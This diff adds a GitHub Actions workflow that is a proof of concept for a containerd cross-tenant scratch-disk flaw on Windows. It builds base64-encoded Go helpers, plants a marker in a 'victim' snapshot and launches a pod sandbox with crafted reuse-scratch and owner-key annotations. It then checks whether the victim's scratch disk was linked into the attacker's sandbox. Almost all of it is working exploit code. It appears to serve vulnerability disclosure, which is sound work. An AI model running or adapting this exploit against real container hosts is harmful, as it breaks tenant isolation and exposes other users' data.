@@ -1,0 +1,84 @@
+name: D17 CRI cross-tenant scratch PoC
+on:
+  workflow_dispatch:
+jobs:
+  cri:
+    runs-on: windows-latest
+    timeout-minutes: 20
+    steps:
+      - name: Setup
+        shell: pwsh
+        run: |
+          $ErrorActionPreference='Stop'
+          $base='C:\ctdpoc'
+          New-Item -ItemType Directory -Force -Path "$base\bin","$base\stub","$base\cricanary","$base\crilogs" | Out-Null
+          Invoke-WebRequest -Uri 'https://github.com/containerd/containerd/releases/download/v2.4.2/containerd-2.4.2-windows-amd64.tar.gz' -OutFile "$base\ctd.tar.gz" -UseBasicParsing
+          tar xzf "$base\ctd.tar.gz" -C "$base\bin"
+          $cfg='dmVyc2lvbiA9IDIKcm9vdCA9ICJDOi9jdGRwb2Mvcm9vdCIKc3RhdGUgPSAiQzovY3RkcG9jL3N0YXRlIgpbcGx1Z2lucy4naW8uY29udGFpbmVyZC5zZXJ2ZXIudjEuZ3JwYyddCiAgYWRkcmVzcyA9ICdcXC5ccGlwZVxjdGQtZ3JwYycKW3BsdWdpbnMuJ2lvLmNvbnRhaW5lcmQuc2VydmVyLnYxLnR0cnBjJ10KICBhZGRyZXNzID0gJ1xcLlxwaXBlXGN0ZC10dHJwYycKW2RlYnVnXQogIGxldmVsID0gJ2RlYnVnJwpbcGx1Z2lucy4naW8uY29udGFpbmVyZC5jcmkudjEuaW1hZ2VzJ10KICBzbmFwc2hvdHRlciA9ICd3aW5kb3dzLWxjb3cnCiAgdXNlX2xvY2FsX2ltYWdlX3B1bGwgPSB0cnVlCiAgW3BsdWdpbnMuJ2lvLmNvbnRhaW5lcmQuY3JpLnYxLmltYWdlcycucnVudGltZV9wbGF0Zm9ybXMucnVuaGNzLWxjb3ddCiAgICBwbGF0Zm9ybSA9ICdsaW51eC9hbWQ2NCcKICAgIHNuYXBzaG90dGVyID0gJ3dpbmRvd3MtbGNvdycKW3BsdWdpbnMuJ2lvLmNvbnRhaW5lcmQuY3JpLnYxLnJ1bnRpbWUnXQogIFtwbHVnaW5zLidpby5jb250YWluZXJkLmNyaS52MS5ydW50aW1lJy5jb250YWluZXJkXQogICAgZGVmYXVsdF9ydW50aW1lX25hbWUgPSAncnVuaGNzLWxjb3cnCiAgICBbcGx1Z2lucy4naW8uY29udGFpbmVyZC5jcmkudjEucnVudGltZScuY29udGFpbmVyZC5ydW50aW1lcy5ydW5oY3MtbGNvd10KICAgICAgcnVudGltZV90eXBlID0gJ2lvLmNvbnRhaW5lcmQucnVuaGNzLnYxJwogICAgICBzbmFwc2hvdHRlciA9ICd3aW5kb3dzLWxjb3cnCiAgW3BsdWdpbnMuJ2lvLmNvbnRhaW5lcmQuY3JpLnYxLnJ1bnRpbWUnLmNuaV0KICAgIGJpbl9kaXJzID0gWydDOi9jdGRwb2MvY25pL2JpbicsICdDOi9Qcm9ncmFtIEZpbGVzL2NvbnRhaW5lcmQvY25pL2JpbiddCiAgICBjb25mX2RpciA9ICdDOi9jdGRwb2MvY25pL2NvbmYnCg=='; [IO.File]::WriteAllBytes("$base\config.toml",[Convert]::FromBase64String($cfg))
+          $st='Ly9nbzpidWlsZCB3aW5kb3dzCgovLyBydW5oY3Nfc3R1Yi5nbyAtIExBQiBIQVJORVNTIGZvciB0aGUgSHlwZXItVi1kZXBlbmRlbnQgcnVuaGNzLmV4ZSBoZWxwZXIuCi8vIEltcGxlbWVudHMgdGhlIG5hcnJvdyBpbnRlcmZhY2UgY29udGFpbmVyZCdzIExDT1cgc25hcHNob3R0ZXIgdXNlczoKLy8gICBydW5oY3MuZXhlIDxnbG9iYWwgZmxhZ3M+IGNyZWF0ZS1zY3JhdGNoIC0tZGVzdHBhdGggPHBhdGg+Ci8vIEl0IGNyZWF0ZXMgYSBmaWxlIGF0IDxwYXRoPiAoYSBzdGFuZC1pbiBmb3IgdGhlIGV4dDQgVkhEWCB0aGF0IGdlbnVpbmUKLy8gcnVuaGNzIHByb2R1Y2VzIHZpYSBhIFVWTSkuIFRoaXMgaXMgTk9UIHRoZSB2dWxuZXJhYmlsaXR5IC0gdGhlIHZ1bG5lcmFibGUKLy8gY29kZSBpcyBjb250YWluZXJkJ3MgdXNlIG9mIGFuIGF0dGFja2VyLWNvbnRyb2xsZWQgbGFiZWwgYXMgYSBmaWxlc3lzdGVtCi8vIHBhdGgsIHdoaWNoIHJ1bnMgZm9yIHJlYWwgaW4gdGhpcyBQb0MuCnBhY2thZ2UgbWFpbgoKaW1wb3J0ICgKICAgICJmbXQiCiAgICAib3MiCikKCmZ1bmMgbWFpbigpIHsKICAgIGRlc3QgOj0gIiIKICAgIGZvciBpLCBhIDo9IHJhbmdlIG9zLkFyZ3MgewogICAgICAgIGlmIGEgPT0gIi0tZGVzdHBhdGgiICYmIGkrMSA8IGxlbihvcy5BcmdzKSB7CiAgICAgICAgICAgIGRlc3QgPSBvcy5BcmdzW2krMV0KICAgICAgICB9CiAgICB9CiAgICBpZiBkZXN0ID09ICIiIHsKICAgICAgICBmbXQuRnByaW50bG4ob3MuU3RkZXJyLCAicnVuaGNzIHN0dWI6IC0tZGVzdHBhdGggcmVxdWlyZWQiKQogICAgICAgIG9zLkV4aXQoMSkKICAgIH0KICAgIGYsIGVyciA6PSBvcy5PcGVuRmlsZShkZXN0LCBvcy5PX0NSRUFURXxvcy5PX1dST05MWXxvcy5PX1RSVU5DLCAwNjAwKQogICAgaWYgZXJyICE9IG5pbCB7CiAgICAgICAgZm10LkZwcmludGxuKG9zLlN0ZGVyciwgInJ1bmhjcyBzdHViOiBvcGVuOiIsIGVycikKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICAvLyBtaW5pbWFsIFZIRFgtbGlrZSBwbGFjZWhvbGRlciBjb250ZW50ICg1MTIgYnl0ZXMpCiAgICBidWYgOj0gbWFrZShbXWJ5dGUsIDUxMikKICAgIGNvcHkoYnVmLCBbXWJ5dGUoImNvbnRhaW5lZCB2aXJ0YWwgZGlzayBwbGFjZWhvbGRlciAobGFiIGhhcm5lc3MpIikpCiAgICBpZiBfLCBlcnIgOj0gZi5Xcml0ZShidWYpOyBlcnIgIT0gbmlsIHsKICAgICAgICBmLkNsb3NlKCkKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICBmLkNsb3NlKCkKICAgIGZtdC5QcmludGxuKCJydW5oY3Mgc3R1YjogY3JlYXRlZCIsIGRlc3QpCn0K'; [IO.File]::WriteAllBytes("$base\stub\main.go",[Convert]::FromBase64String($st))
+          Set-Content "$base\stub\go.mod" -Value "module stub`n`ngo 1.24" -Encoding ascii
+          $env:GO111MODULE='on'; Set-Location "$base\stub"; go build -o "$base\bin\bin\runhcs.exe" . 2>&1 | Out-Null
+          New-Item -ItemType Directory -Force -Path "$base\cni\bin","$base\cni\conf" | Out-Null
+          $cni='cGFja2FnZSBtYWluCgppbXBvcnQgImZtdCIKCmZ1bmMgbWFpbigpIHsKICAgIC8vIE1pbmltYWwgQ05JIEFERCByZXN1bHQgc28gY29udGFpbmVyZCdzIENOSSBzZXR1cCBzdWNjZWVkcyBpbiB0aGUgbGFiLgogICAgZm10LlByaW50KGB7ImNuaVZlcnNpb24iOiIxLjAuMCIsImlwcyI6W3siaXAiOiIxMC4yNDQuOTkuMi8yNCJ9XSwicm91dGVzIjpbXSwiZG5zIjp7fX1gKQp9Cg=='; [IO.File]::WriteAllBytes("$base\cni\src.go",[Convert]::FromBase64String($cni))
+          Set-Content "$base\cni\go.mod" -Value "module cni`n`ngo 1.24" -Encoding ascii
+          $env:GO111MODULE='on'; Set-Location "$base\cni"; go build -o "$base\cni\bin\d17noop.exe" . 2>&1 | Out-Null
+          New-Item -ItemType Directory -Force -Path 'C:\Program Files\containerd\cni\bin','C:\Program Files\containerd\cni\conf' | Out-Null
+          Copy-Item "$base\cni\bin\d17noop.exe" 'C:\Program Files\containerd\cni\bin\' -Force
+          $cc=@'
+          {"cniVersion":"1.0.0","name":"d17net","plugins":[{"type":"d17noop"}]}
+          '@
+          $cc | Set-Content 'C:\Program Files\containerd\cni\conf\10-d17.conflist' -Encoding ascii
+          Set-Content "$base\cni\conf\10-d17.conflist" -Value '{"cniVersion":"1.0.0","name":"d17net","plugins":[{"type":"d17noop"}]}' -Encoding ascii
+          Invoke-WebRequest -Uri 'https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.32.0/crictl-v1.32.0-windows-amd64.tar.gz' -OutFile "$base\crictl.tgz" -UseBasicParsing
+          tar xzf "$base\crictl.tgz" -C "$base"
+          $hp='cGFja2FnZSBtYWluCgppbXBvcnQgKAogICAgImNvbnRleHQiCiAgICAiZm10IgogICAgIm9zIgogICAgInBhdGgvZmlsZXBhdGgiCgogICAgImdpdGh1Yi5jb20vY29udGFpbmVyZC9jb250YWluZXJkL3YyL2NsaWVudCIKICAgICJnaXRodWIuY29tL2NvbnRhaW5lcmQvY29udGFpbmVyZC92Mi9jb3JlL3NuYXBzaG90cyIKKQoKLy8gbW9kZSAidmljdGltIjogcHJlcGFyZSBhIG5vcm1hbCBzbmFwc2hvdCB3aXRoIGEgZGlzdGluY3RpdmUgbWFya2VyLgovLyBtb2RlICJjaGVjayI6IHJlcG9ydCBzYW5kYm94LnZoZHggc3ltbGlua3MgYWNyb3NzIGFsbCBzbmFwc2hvdCBkaXJzLgpmdW5jIG1haW4oKSB7CiAgICBpZiBsZW4ob3MuQXJncykgPCAyIHsgZm10LlByaW50bG4oIm5lZWQgbW9kZSIpOyBvcy5FeGl0KDIpIH0KICAgIG1vZGUgOj0gb3MuQXJnc1sxXQogICAgY3R4IDo9IGNvbnRleHQuQmFja2dyb3VuZCgpCiAgICBjLCBlcnIgOj0gY2xpZW50Lk5ldyhgXFwuXHBpcGVcY3RkLWdycGNgLCBjbGllbnQuV2l0aERlZmF1bHROYW1lc3BhY2UoIms4cy5pbyIpKQogICAgaWYgZXJyICE9IG5pbCB7IGZtdC5QcmludGxuKCJDTElFTlRfRVJSOiIsIGVycik7IG9zLkV4aXQoMSkgfQogICAgZGVmZXIgYy5DbG9zZSgpCiAgICBzcyA6PSBjLlNuYXBzaG90U2VydmljZSgid2luZG93cy1sY293IikKCiAgICBpZiBtb2RlID09ICJ2aWN0aW0iIHsKICAgICAgICBtLCBlcnIgOj0gc3MuUHJlcGFyZShjdHgsICJ2aWN0aW0tdGVuYW50LXNuYXAiLCAiIiwgc25hcHNob3RzLldpdGhMYWJlbHMobWFwW3N0cmluZ11zdHJpbmd7ImQxNy5yb2xlIjogInZpY3RpbSJ9KSkKICAgICAgICBpZiBlcnIgIT0gbmlsIHsgZm10LlByaW50bG4oIlZJQ1RJTV9QUkVQQVJFX0VSUjoiLCBlcnIpOyBvcy5FeGl0KDEpIH0KICAgICAgICBwIDo9IGZpbGVwYXRoLkpvaW4obVswXS5Tb3VyY2UsICJzYW5kYm94LnZoZHgiKQogICAgICAgIG1hcmtlciA6PSAiRDE3X0NSX0NST1NTX1RFTkFOVF9NQVJLRVJfMkU3QiIKICAgICAgICBpZiBlcnIgOj0gb3MuV3JpdGVGaWxlKHAsIFtdYnl0ZShtYXJrZXIpLCAwNjAwKTsgZXJyICE9IG5pbCB7IGZtdC5QcmludGxuKCJNQVJLRVJfRVJSOiIsIGVycik7IG9zLkV4aXQoMSkgfQogICAgICAgIGZtdC5QcmludGxuKCJWSUNUSU1fU0FOREJPWDoiLCBwKQogICAgICAgIGZtdC5QcmludGxuKCJWSUNUSU1fTUFSS0VSOiIsIG1hcmtlcikKICAgICAgICByZXR1cm4KICAgIH0KICAgIGlmIG1vZGUgPT0gImNoZWNrIiB7CiAgICAgICAgcm9vdCA6PSBgQzpcY3RkcG9jXHJvb3RcaW8uY29udGFpbmVyZC5zbmFwc2hvdHRlci52MS53aW5kb3dzLWxjb3dcc25hcHNob3RzYAogICAgICAgIGVudHMsIF8gOj0gb3MuUmVhZERpcihyb290KQogICAgICAgIGZvdW5kIDo9IGZhbHNlCiAgICAgICAgZm9yIF8sIGUgOj0gcmFuZ2UgZW50cyB7CiAgICAgICAgICAgIHAgOj0gZmlsZXBhdGguSm9pbihyb290LCBlLk5hbWUoKSwgInNhbmRib3gudmhkeCIpCiAgICAgICAgICAgIGZpLCBlcnIgOj0gb3MuTHN0YXQocCkKICAgICAgICAgICAgaWYgZXJyICE9IG5pbCB7IGNvbnRpbnVlIH0KICAgICAgICAgICAgaWYgZmkuTW9kZSgpJm9zLk1vZGVTeW1saW5rICE9IDAgewogICAgICAgICAgICAgICAgdCwgXyA6PSBvcy5SZWFkbGluayhwKQogICAgICAgICAgICAgICAgYiwgXyA6PSBvcy5SZWFkRmlsZShwKQogICAgICAgICAgICAgICAgZm10LlByaW50bG4oIlNZTUxJTktfQVQ6IiwgcCkKICAgICAgICAgICAgICAgIGZtdC5QcmludGxuKCJSRUFETElOSzoiLCB0KQogICAgICAgICAgICAgICAgZm10LlByaW50bG4oIlJFQURfQ09OVEVOVDoiLCBzdHJpbmcoYikpCiAgICAgICAgICAgICAgICBmbXQuUHJpbnRsbigiQ1JPU1NfVEVOQU5UX0NSSV9QUk9WRU46Iiwgc3RyaW5nKGIpPT0iRDE3X0NSX0NST1NTX1RFTkFOVF9NQVJLRVJfMkU3QiIpCiAgICAgICAgICAgICAgICBmb3VuZCA9IHRydWUKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAhZm91bmQgeyBmbXQuUHJpbnRsbigiTk9fU1lNTElOS19GT1VORCIpIH0KICAgICAgICByZXR1cm4KICAgIH0KICAgIGZtdC5QcmludGxuKCJiYWQgbW9kZSIpOyBvcy5FeGl0KDIpCn0K'; [IO.File]::WriteAllBytes("$base\helper.go",[Convert]::FromBase64String($hp))
+          Copy-Item "$base\go\go.mod" "$base\helper.mod" -ErrorAction SilentlyContinue
+          New-Item -ItemType Directory -Force -Path "$base\helper" | Out-Null
+          [IO.File]::WriteAllBytes("$base\helper\main.go",[Convert]::FromBase64String($hp))
+          Copy-Item "$base\stub\go.mod" "$base\helper\go.mod"
+          $env:GO111MODULE='on'; Set-Location "$base\helper"; go mod tidy 2>&1 | Out-Null
+          go build -o "$base\helper.exe" . 2>&1 | Tee-Object "$base\helperbuild.log"
+          Write-Output "HELPER_RC=$LASTEXITCODE"
+          Get-Item "$base\crictl.exe" | Select-Object FullName,Length | Format-List
+
+      - name: Run daemon + CRI PodSandbox with malicious annotation
+        shell: pwsh
+        run: |
+          $ErrorActionPreference='Continue'
+          $base='C:\ctdpoc'
+          $sb='eyJtZXRhZGF0YSI6IHsibmFtZSI6ICJkMTctY3JpLWNyb3NzIiwgIm5hbWVzcGFjZSI6ICJkMTdjcmljcm9zcyIsICJhdHRlbXB0IjogMSwgInVpZCI6ICJkMTdjcm9zcy11aWQifSwgImhvc3RuYW1lIjogImQxN2hvc3QiLCAibG9nX2RpcmVjdG9yeSI6ICJDOi9jdGRwb2MvY3JpbG9ncyIsICJhbm5vdGF0aW9ucyI6IHsiY29udGFpbmVyZC5pby9zbmFwc2hvdC9pby5taWNyb3NvZnQuY29udGFpbmVyLnN0b3JhZ2UucmV1c2Utc2NyYXRjaCI6ICJ0cnVlIiwgImNvbnRhaW5lcmQuaW8vc25hcHNob3QvaW8ubWljcm9zb2Z0Lm93bmVyLmtleSI6ICJ2aWN0aW0tdGVuYW50In0sICJsaW51eCI6IHt9LCAid2luZG93cyI6IHt9fQ=='; [IO.File]::WriteAllBytes("$base\sandbox.json",[Convert]::FromBase64String($sb))
+          $p=Start-Process -FilePath "$base\bin\bin\containerd.exe" -ArgumentList @('--config',"$base\config.toml",'--log-level','debug') -RedirectStandardOutput "$base\stdout.log" -RedirectStandardError "$base\stderr.log" -PassThru
+          Write-Output "CONTAINERD_PID=$($p.Id)"
+          Start-Sleep -Seconds 8
+          $env:CONTAINERD_RUNTIME_ENDPOINT='npipe:////./pipe/ctd-grpc'
+          & "$base\crictl.exe" --runtime-endpoint 'npipe:////./pipe/ctd-grpc' info 2>&1 | Select-Object -First 20
+          Write-Output '=== pull pause ==='
+          & "$base\crictl.exe" --runtime-endpoint 'npipe:////./pipe/ctd-grpc' pull registry.k8s.io/pause:3.10 2>&1 | Select-Object -Last 5
+          Write-Output '=== setup victim snapshot ==='
+          & "$base\helper.exe" victim 2>&1 | Tee-Object "$base\victim.out"
+          Write-Output '=== runp ==='
+
+          & "$base\crictl.exe" --runtime-endpoint 'npipe:////./pipe/ctd-grpc' --timeout 120s runp --runtime runhcs-lcow "$base\sandbox.json" 2>&1 | Tee-Object -FilePath "$base\runp.out"
+          Write-Output "RUNP_EXIT=$LASTEXITCODE"
+          Start-Sleep -Seconds 3
+          Write-Output '=== check cross-tenant symlink ==='
+          & "$base\helper.exe" check 2>&1 | Tee-Object "$base\check.out"
+          Write-Output '=== CRI CANARY ==='
+
+          Get-ChildItem "$base\cricanary" -Force | Select-Object Name,Length | Format-Table
+          Write-Output "CRI_HOST_FILE_WRITTEN=$(Test-Path "$base\cricanary\scratch.vhdx")"
+          Write-Output '=== daemon key lines ==='
+          if (Test-Path "$base\stderr.log") { Select-String -Path "$base\stderr.log" -Pattern 'prepare snapshot|rootfs.location|scratch.vhdx not found|snapshotter error|RunPodSandbox' | Select-Object -Last 15 }
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ctd-cricross-evidence
+          path: |
+            C:\ctdpoc\runp.out
+            C:\ctdpoc\stderr.log
+            C:\ctdpoc\victim.out
+            C:\ctdpoc\check.out
+            C:\ctdpoc\sandbox.json
+          if-no-files-found: warn
